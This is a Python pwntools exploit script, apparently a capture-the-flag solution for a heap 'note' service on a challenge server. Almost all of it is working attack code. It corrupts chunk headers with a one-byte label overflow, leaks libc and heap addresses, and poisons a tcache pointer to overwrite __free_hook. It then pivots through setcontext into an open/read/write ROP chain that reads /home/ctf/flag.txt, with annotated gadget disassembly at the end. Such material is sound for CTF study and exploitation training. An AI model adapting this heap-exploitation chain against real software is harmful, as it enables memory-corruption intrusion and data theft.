from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = 'challs.xmas.htsp.ro'
PORT = 2005

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return remote('172.17.0.2', 5333)
        # return process(TARGET)
        # return process(["./ld-2.32.so", TARGET], env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def create(idx, size, data, label):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(size))
    r.sendafter(': ', data)
    r.sendafter(': ', label)
def show(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))

def edit(idx, data):
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', str(idx))
    r.sendafter(': ', data)




r = start()

for i in range(5):
    create(i, 0x88, 'A', 'B')
for i in range(5):
    delete(i)


create(0, 0x18, 'A'*8, 'B')
create(1, 0x18, 'a'*8, 'b')
create(2, 0x18, 'a'*8, 'b')
create(3, 0x18, 'a'*8, 'b')
create(4, 0x90, p64(0x21)*(0x88/8)+p64(0x31), 'b')

delete(0)
create(0, 0x18, 'A'*8, 'B'*0x10+'\xff')
payload = flat(0, 0, 0, 0x91)*3

edit(1, payload)
delete(0)
create(0, 0x18, 'A'*8, 'B'*0x10+'\x18')
delete(1)
create(1, 0x18, 'A'*8, 'B'*0x10+'\x88')
delete(2)
create(2, 0x18, 'A'*8, 'B'*0x10+'\x88')
delete(3)
create(3, 0x18, 'A'*8, 'B'*0x10+'\x88')
if args.D:
    debug(r, [])
delete(4)

delete(1)
create(1, 0x88, 'A'*8, 'B')
delete(2)
create(2, 0x88, flat(0, 0, 0, 0x101), 'B')
delete(3)
delete(0)
create(0, 0x18, 'A'*8, 'B'*0x10+'\xff')
show(1)

r.recvuntil('Data: ')
blob = r.recv(0xff)
print hexdump(blob)
leak = u64(blob[0x20:0x28])
dbg('leak')
base = leak - 0x1e3c00
dbg('base')
magic = base + 0x14b760
setcontext = base + 0x5306d
fh = base + 0x1e6e40

syscall = base + 0x000611ea
rdx_p1 = base + 0x00114161
rax = base + 0x0004557f
rsi = base + 0x0002ac3f
rdi = base + 0x0002858f
p3 = base + 0x00029520

leak = u64(blob[0xc8:0xd0])
dbg('leak')
heap = leak - 0x10
dbg('heap')


payload = blob[:0xe0]
payload += p64(fh ^ (heap >> 12))
payload += blob[0xe8:]
edit(1, payload)
delete(1)
delete(2)

name = "/home/ctf/flag.txt"
create(1, 0x18, name, 'B')
create(2, 0x18, p64(magic), 'B')


# plan
# OFS = heap + offset
# OFS2 = heap + offset2 = heap +0x8e8
# rdi+0x8: OFS
# rdi+0x28: setcontext

# OFS+0xa0: heap+OFS2 (addr of rop chain)
# OFS+0xa8: heap+OFS2-8 (ret)

# 

name_addr = heap + 0x8c0
payload = ''
payload += "A"*8 + p64(heap+0x8e0)
payload += 'B'*0x10
payload += p64(setcontext)

# payload += flat(0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd) #13
payload += flat(rax, 2, rdi, name_addr, rsi, 0, rdx_p1, 0, 0, syscall, rax, 0, p3) # 13
payloadA = payload

payload = ''
# payload += flat(rax, 2, rdi, name_addr, rsi, 0, rdx_p1, 0, 0, syscall)
# payload += flat(rax, 0, rdi, 3, rsi, heap+0x2a0, rdx_p1, 0x100, 0, syscall)
# payload += flat(rax, 1, rdi, 1, rsi, heap+0x2a0, rdx_p1, 0x100, 0, syscall)
# payload += flat(heap+0x908, rdi+1, 0x333, 0x444, 0x555, 0x666, 0x777, 0x888, 0x999, 0xaaa, 0xbbb, 0xccc, 0xddd)
payload += flat(heap+0x908, rdi+1, rdi, 3, rsi, heap+0x2a0, rdx_p1, 0x100, 0, syscall)
# payload += flat(0xa11, 0x122, 0x133, 0x144, 0x155)
payload += flat(rax, 1, rdi, 1, syscall)
payloadB = payload

create(3, 0x90, payloadA, 'B')
create(4, 0x90, payloadB, 'B')
delete(3) # trigger free






'''
for i in range(3):
    create(i+2, 0x90, p64(0x21)*(0x90/8), 'B') # spray
    
for i in range(3):
    delete(4-i)

for i in range(3):
    create(i+2, 0x88, p64(0x21)*(0x88/8), 'B') # spray

for i in range(3):
    delete(i+2)

for i in range(3):
    create(i+2, 0x78, p64(0x21)*(0x78/8), 'B') # spray

for i in range(3):
    delete(i+2)

create(2, 0x90, '1'*0x90, 'B') # victim
'''


'''
14b760:   48 8b 57 08             mov    rdx,QWORD PTR [rdi+0x8]
14b764:   48 89 04 24             mov    QWORD PTR [rsp],rax
14b768:   ff 52 20                call   QWORD PTR [rdx+0x20]
'''

'''
should be ok
5306d:   48 8b a2 a0 00 00 00    mov    rsp,QWORD PTR [rdx+0xa0]
53074:   48 8b 9a 80 00 00 00    mov    rbx,QWORD PTR [rdx+0x80]
5307b:   48 8b 6a 78             mov    rbp,QWORD PTR [rdx+0x78]
5307f:   4c 8b 62 48             mov    r12,QWORD PTR [rdx+0x48]
53083:   4c 8b 6a 50             mov    r13,QWORD PTR [rdx+0x50]
53087:   4c 8b 72 58             mov    r14,QWORD PTR [rdx+0x58]
5308b:   4c 8b 7a 60             mov    r15,QWORD PTR [rdx+0x60]
5308f:   64 f7 04 25 48 00 00    test   DWORD PTR fs:0x48,0x2
53096:   00 02 00 00 00
5309b:   0f 84 b5 00 00 00       je     53156 <setcontext@@GLIBC_2.2.5+0x126>
-------
53156:   48 8b 8a a8 00 00 00    mov    rcx,QWORD PTR [rdx+0xa8]
5315d:   51                      push   rcx
5315e:   48 8b 72 70             mov    rsi,QWORD PTR [rdx+0x70]
53162:   48 8b 7a 68             mov    rdi,QWORD PTR [rdx+0x68]
53166:   48 8b 8a 98 00 00 00    mov    rcx,QWORD PTR [rdx+0x98]
5316d:   4c 8b 42 28             mov    r8,QWORD PTR [rdx+0x28]
53171:   4c 8b 4a 30             mov    r9,QWORD PTR [rdx+0x30]
53175:   48 8b 92 88 00 00 00    mov    rdx,QWORD PTR [rdx+0x88]
5317c:   31 c0                   xor    eax,eax
5317e:   c3                      ret  

'''

r.interactive()
r.close()
